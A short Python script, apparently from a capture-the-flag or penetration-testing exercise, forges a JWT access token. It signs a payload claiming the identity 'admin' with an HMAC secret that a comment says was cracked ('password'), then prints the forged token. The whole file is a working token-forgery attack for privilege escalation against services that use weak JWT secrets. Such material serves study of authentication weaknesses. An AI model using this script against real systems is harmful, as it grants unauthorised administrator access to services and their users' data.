import jwt

secret = "password"  # cracked secret
payload = {"csrf":"0508eefa-decc-431f-aba9-ea06ae8378cc","jti":"7d60ff7e-6e6c-4fdf-95aa-1b023d69bd7e","exp":1764776046,"fresh":False,"iat":1764775146,"type":"access","nbf":1764775146,"identity":"admin"}
new_token = jwt.encode(payload, secret, algorithm="HS256")
print(new_token)
